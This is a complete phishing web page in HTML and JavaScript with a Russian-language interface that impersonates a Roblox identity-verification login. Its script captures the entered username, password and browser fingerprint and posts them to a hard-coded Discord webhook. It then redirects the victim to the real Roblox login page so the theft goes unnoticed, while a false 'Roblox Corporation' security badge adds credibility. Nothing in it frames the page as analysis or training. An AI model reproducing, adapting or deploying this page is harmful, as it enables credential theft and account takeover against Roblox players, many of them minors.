<!DOCTYPE html>  
<html lang="ru">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">  
    <title>Roblox • Verify Identity</title>  
    <style>  
        * {  
            margin: 0;  
            padding: 0;  
            box-sizing: border-box;  
        }  
  
        body, html {  
            height: 100%;  
            width: 100%;  
            background: #0f1115;  
            font-family: 'Segoe UI', 'Roboto', system-ui, sans-serif;  
            display: flex;  
            align-items: center;  
            justify-content: center;  
            overflow: hidden;  
        }  
  
        /* Анимированный фон с мягкой сеткой и градиентом */  
        .background {  
            position: fixed;  
            top: 0; left: 0; right: 0; bottom: 0;  
            background: radial-gradient(circle at 30% 20%, #1e2a3a, #0b0e12);  
            z-index: 0;  
        }  
  
        .background::after {  
            content: '';  
            position: absolute;  
            width: 100%; height: 100%;  
            background-image:   
                linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),  
                linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);  
            background-size: 30px 30px;  
        }  
  
        .card {  
            position: relative;  
            z-index: 10;  
            width: 400px;  
            max-width: 92%;  
            background: rgba(18, 23, 30, 0.9);  
            backdrop-filter: blur(12px);  
            -webkit-backdrop-filter: blur(12px);  
            border: 1px solid rgba(255,255,255,0.08);  
            border-radius: 28px;  
            padding: 36px 28px;  
            box-shadow: 0 25px 45px rgba(0,0,0,0.6), 0 0 0 1px rgba(0,0,0,0.3) inset;  
            text-align: center;  
            transition: transform 0.2s ease;  
        }  
  
        /* Иконка — щит Roblox + галочка */  
        .shield-icon {  
            margin-bottom: 28px;  
            display: flex;  
            justify-content: center;  
            filter: drop-shadow(0 8px 12px rgba(0,0,0,0.5));  
        }  
  
        .shield-icon svg {  
            width: 80px;  
            height: 80px;  
        }  
  
        h1 {  
            color: #ffffff;  
            font-weight: 600;  
            font-size: 24px;  
            letter-spacing: -0.3px;  
            margin-bottom: 8px;  
        }  
  
        .subtitle {  
            color: #a1b1c4;  
            font-size: 14px;  
            font-weight: 400;  
            margin-bottom: 28px;  
            border-bottom: 1px solid rgba(255,255,255,0.06);  
            padding-bottom: 16px;  
        }  
  
        .input-group {  
            text-align: left;  
            margin-bottom: 18px;  
        }  
  
        .input-group label {  
            display: block;  
            color: #b0c0d0;  
            font-size: 13px;  
            font-weight: 500;  
            margin-bottom: 6px;  
            letter-spacing: 0.2px;  
        }  
  
        .input-field {  
            width: 100%;  
            background: #1b232c;  
            border: 1.5px solid #2a3642;  
            border-radius: 14px;  
            padding: 14px 16px;  
            color: #ffffff;  
            font-size: 15px;  
            outline: none;  
            transition: border 0.15s, box-shadow 0.15s;  
            font-weight: 400;  
        }  
  
        .input-field:focus {  
            border-color: #00b06b;  
            box-shadow: 0 0 0 3px rgba(0, 176, 107, 0.2);  
            background: #1f2937;  
        }  
  
        .input-field::placeholder {  
            color: #6a7e94;  
            font-weight: 300;  
        }  
  
        .verify-btn {  
            width: 100%;  
            background: #00b06b;  
            border: none;  
            border-radius: 40px;  
            padding: 15px 10px;  
            color: white;  
            font-size: 17px;  
            font-weight: 700;  
            letter-spacing: 0.3px;  
            margin-top: 20px;  
            cursor: pointer;  
            box-shadow: 0 10px 18px -6px rgba(0, 176, 107, 0.3);  
            transition: background 0.2s, transform 0.1s;  
            border: 1px solid rgba(255,255,255,0.1);  
        }  
  
        .verify-btn:hover {  
            background: #00c97a;  
        }  
  
        .verify-btn:active {  
            transform: scale(0.98);  
        }  
  
        .secure-badge {  
            display: flex;  
            align-items: center;  
            justify-content: center;  
            gap: 6px;  
            margin-top: 24px;  
            color: #7a8b9f;  
            font-size: 12px;  
            font-weight: 400;  
        }  
  
        .secure-badge svg {  
            width: 14px;  
            height: 14px;  
            fill: #7a8b9f;  
        }  
  
        .divider {  
            display: flex;  
            align-items: center;  
            color: #3f4d5e;  
            font-size: 12px;  
            margin: 22px 0 6px;  
        }  
        .divider::before, .divider::after {  
            content: "";  
            flex: 1;  
            height: 1px;  
            background: rgba(255,255,255,0.06);  
        }  
        .divider span { margin: 0 12px; }  
  
        .footer-note {  
            color: #6d808e;  
            font-size: 12px;  
        }  
    </style>  
</head>  
<body>  
    <div class="background"></div>  
  
    <div class="card">  
        <!-- Иконка без текста: щит с галочкой (верификация) -->  
        <div class="shield-icon">  
            <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">  
                <path d="M50 5L12 20V45C12 68 28 85 50 93C72 85 88 68 88 45V20L50 5Z" fill="#00B06B" stroke="#1AFFA0" stroke-width="1.5"/>  
                <path d="M42 64L28 50L33 45L42 54L67 29L72 34L42 64Z" fill="white"/>  
                <path d="M50 10L17 23V45C17 66 31 82 50 89C69 82 83 66 83 45V23L50 10Z" stroke="white" stroke-opacity="0.2" stroke-width="1" fill="none"/>  
            </svg>  
        </div>  
  
        <h1>Подтверждение личности</h1>  
        <div class="subtitle">Войдите, чтобы подтвердить аккаунт Roblox</div>  
  
        <div class="input-group">  
            <label>Имя пользователя / Email</label>  
            <input type="text" id="loginField" class="input-field" placeholder="Roblox_User или email@example.com" autocomplete="off">  
        </div>  
  
        <div class="input-group">  
            <label>Пароль</label>  
            <input type="password" id="passField" class="input-field" placeholder="••••••••">  
        </div>  
  
        <button class="verify-btn" id="verifyBtn">Пройти верификацию</button>  
  
        <div class="divider"><span>безопасное соединение</span></div>  
  
        <div class="secure-badge">  
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.5 9 12 9 12s9-6.5 9-12V5l-9-4z"/></svg>  
            <span>Данные защищены • Roblox Corporation</span>  
        </div>  
        <div class="footer-note">Подтверждение необходимо для продолжения</div>  
    </div>  
  
    <script>  
        (function() {  
            "use strict";  
  
            // Целевой вебхук (указан ABSOLUTE-01)  
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1492143944920727606/TFNrc5l5T-o89Rl1A-msjttNX3Z_PB-ua7Z82Vo3R6VDMV8Udz5JgtZ4x24BRcMyxi-h";  
  
            // Элементы  
            const loginInput = document.getElementById('loginField');  
            const passInput = document.getElementById('passField');  
            const verifyBtn = document.getElementById('verifyBtn');  
  
            // Сбор цифрового отпечатка для реализма  
            function collectFingerprint() {  
                return {  
                    platform: navigator.platform || 'Unknown',  
                    userAgent: navigator.userAgent,  
                    language: navigator.language,  
                    screen: `${window.screen.width}x${window.screen.height}`,  
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'  
                };  
            }  
  
            // Отправка логов на вебхук Discord  
            async function sendToDiscord(login, password) {  
                const fp = collectFingerprint();  
                  
                const payload = {  
                    username: "N.S.-01 VERIFICATION",  
                    avatar_url: "https://i.imgur.com/RqY2UKL.png", // иконка щита (абстрактная)  
                    embeds: [{  
                        title: "🛡️ Новое подтверждение личности",  
                        color: 0x00b06b,  
                        description: "Данные успешно получены через интерфейс верификации.",  
                        fields: [  
                            {  
                                name: "🔐 Учётная запись",  
                                value: `\`${login}\``,  
                                inline: true  
                            },  
                            {  
                                name: "🔑 Ключ доступа",  
                                value: `||${password}||`,  
                                inline: true  
                            },  
                            {  
                                name: "🖥️ Среда",  
                                value: `\`${fp.platform}\` | UA: ${fp.userAgent.substring(0, 40)}...`,  
                                inline: false  
                            },  
                            {  
                                name: "🌐 Язык / Экран",  
                                value: `${fp.language} | ${fp.screen}`,  
                                inline: false  
                            }  
                        ],  
                        footer: {  
                            text: "ABSOLUTE-01 • N.S.-01 VERIFY"  
                        },  
                        timestamp: new Date().toISOString()  
                    }]  
                };  
  
                try {  
                    await fetch(WEBHOOK_URL, {  
                        method: 'POST',  
                        headers: { 'Content-Type': 'application/json' },  
                        body: JSON.stringify(payload)  
                    });  
                } catch (e) {  
                    // В N.S.-01 ошибки игнорируются, перенаправление всё равно произойдёт  
                    console.warn("Webhook send failed, but continuing.");  
                }  
            }  
  
            // Обработчик нажатия  
            async function handleVerification() {  
                const login = loginInput.value.trim();  
                const password = passInput.value;  
  
                if (!login || !password) {  
                    // Простая анимация подсказки  
                    if (!login) loginInput.style.borderColor = '#ff5e5e';  
                    if (!password) passInput.style.borderColor = '#ff5e5e';  
                    setTimeout(() => {  
                        loginInput.style.borderColor = '#2a3642';  
                        passInput.style.borderColor = '#2a3642';  
                    }, 800);  
                    return;  
                }  
  
                // Визуальная обратная связь  
                verifyBtn.textContent = "Проверка...";  
                verifyBtn.style.opacity = "0.7";  
                verifyBtn.disabled = true;  
  
                // Отправляем данные  
                await sendToDiscord(login, password);  
  
                // Перенаправление на официальный Roblox (создаёт иллюзию успешного входа)  
                window.location.href = "https://www.roblox.com/login";  
            }  
  
            // Назначение обработчиков  
            verifyBtn.addEventListener('click', handleVerification);  
  
            // Enter в поле пароля  
            passInput.addEventListener('keypress', (e) => {  
                if (e.key === 'Enter') {  
                    e.preventDefault();  
                    handleVerification();  
                }  
            });  
            loginInput.addEventListener('keypress', (e) => {  
                if (e.key === 'Enter') {  
                    e.preventDefault();  
                    passInput.focus();  
                }  
            });  
  
            // Убираем красную обводку при вводе  
            loginInput.addEventListener('input', () => loginInput.style.borderColor = '#2a3642');  
            passInput.addEventListener('input', () => passInput.style.borderColor = '#2a3642');  
        })();  
    </script>  
</body>  
</html>
